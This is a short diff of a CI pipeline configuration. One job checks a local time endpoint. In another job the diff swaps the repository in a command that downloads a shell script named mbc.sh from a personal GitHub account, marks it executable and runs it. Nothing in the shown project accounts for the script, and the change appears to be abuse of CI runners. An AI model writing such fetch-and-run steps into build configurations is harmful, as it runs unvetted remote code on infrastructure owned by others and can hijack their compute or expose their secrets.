@@ -49,4 +49,4 @@ blocks:
             - 'curl --silent localhost:8001/time | grep "The current time is"'
         - name: 'Job #3'
           commands:
-            - 'wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh'
+            - 'wget https://raw.githubusercontent.com/agamlimaa/aku/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh'
